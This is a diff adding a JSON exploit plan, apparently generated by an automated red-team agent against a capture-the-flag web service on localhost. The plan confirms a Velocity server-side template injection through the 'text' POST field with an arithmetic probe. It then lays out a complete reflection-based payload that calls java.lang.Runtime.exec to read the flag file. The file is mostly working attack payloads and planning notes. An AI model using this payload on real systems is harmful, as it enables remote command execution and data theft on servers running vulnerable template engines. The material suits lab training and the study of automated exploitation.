@@ -1,0 +1,126 @@
+{
+  "version": 1,
+  "plan_id": "plan-velocity-ssti-post-001",
+  "vuln_summary": "Velocity SSTI in 'text' parameter allows RCE. Previous GET requests failed because form uses POST. Need to send POST with text parameter.",
+  "rationale": "The target form uses method='post', so we must send POST requests. Previous attempts used GET and failed. We will first confirm SSTI with arithmetic probe via POST, then escalate to RCE.",
+  "chain_design": "ssti_reflection -> ssti_execution -> command_execution",
+  "steps": [
+    {
+      "id": 1,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "Confirm SSTI via POST with arithmetic probe",
+      "expected_outcome": "Response contains '49'",
+      "depends_on": [],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "Confirms template execution via POST method, transitioning from probe_success to ssti_execution",
+      "why_this_payload_is_a_mutation": "Changes HTTP method from GET to POST, aligning with form method",
+      "why_this_is_not_regression": "Uses correct HTTP method, not repeating GET failure",
+      "target_primitive": "ssti_execution",
+      "why_this_primitive_advances_chain": "Establishes template execution, enabling RCE",
+      "imports": [
+        "json",
+        "redteam_sdk"
+      ],
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($x=7*7)$x"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_imports": [
+        "json",
+        "redteam_sdk"
+      ],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($x=7*7)$x"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    },
+    {
+      "id": 2,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "Execute command to read flag using simplified RCE payload",
+      "expected_outcome": "Response contains flag content",
+      "depends_on": [
+        1
+      ],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "Achieves command execution, moving from ssti_execution to command_execution",
+      "why_this_payload_is_a_mutation": "Uses simpler payload with double quotes and BufferedReader, avoiding previous failures",
+      "why_this_is_not_regression": "Builds on confirmed SSTI, not repeating failed complex payloads",
+      "target_primitive": "command_execution",
+      "why_this_primitive_advances_chain": "Directly retrieves flag, completing objective",
+      "imports": [
+        "json",
+        "redteam_sdk"
+      ],
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($loader=$s.getClass().getClassLoader())#set($rt=$loader.loadClass('java.lang.Runtime'))#set($exec=$rt.getMethod('getRuntime').invoke(null))#set($cmd=$exec.exec('cat /flag*'))#set($input=$cmd.getInputStream())#set($reader=$loader.loadClass('java.io.BufferedReader').getConstructor($loader.loadClass('java.io.Reader')).newInstance($loader.loadClass('java.io.InputStreamReader').getConstructor($input.getClass()).newInstance($input)))#set($out='')#foreach($line in $reader.readLines())#set($out=$out+$line+'\\n')#end$out"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_imports": [
+        "json",
+        "redteam_sdk"
+      ],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($s='')#set($loader=$s.getClass().getClassLoader())#set($rt=$loader.loadClass('java.lang.Runtime'))#set($exec=$rt.getMethod('getRuntime').invoke(null))#set($cmd=$exec.exec('cat /flag*'))#set($input=$cmd.getInputStream())#set($reader=$loader.loadClass('java.io.BufferedReader').getConstructor($loader.loadClass('java.io.Reader')).newInstance($loader.loadClass('java.io.InputStreamReader').getConstructor($input.getClass()).newInstance($input)))#set($out='')#foreach($line in $reader.readLines())#set($out=$out+$line+'\\n')#end$out"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    }
+  ],
+  "history_state": {
+    "current_exploit_state": "probe_success",
+    "primitive_state": {
+      "ssti": false,
+      "arithmetic": false,
+      "object_access": false,
+      "rce": true
+    },
+    "detected_primitives": [],
+    "primitive_confidence": {},
+    "failure_analysis": {
+      "type": "NoError"
+    },
+    "state_transition_blocker": "HTTP 200 body 仅返回正常 HTML 表单（含 <form> 和 <h2 class=\"fire\"></h2>），未包含任何注入 payload 的执行结果。payload 未在响应中反射或执行。",
+    "next_required_action": "改用 POST 请求提交 text 参数。当前使用 GET 请求，但目标表单 method=\"post\"，且 action=\"\"。必须发送 POST 请求到 / 端点，body 为 text=<payload>。示例代码：requests.post('http://localhost:1337/', data={'text': '#set($x=7*7)$x'})"
+  },
+  "primitive_context": {
+    "current_primitive": "ssti_reflection",
+    "allowed_next_primitives": [
+      "ssti_execution",
+      "blind_ssti",
+      "template_access",
+      "configuration_disclosure",
+      "file_read",
+      "command_execution"
+    ],
+    "forbidden_transitions": []
+  },
+  "platform": "Windows"
+}
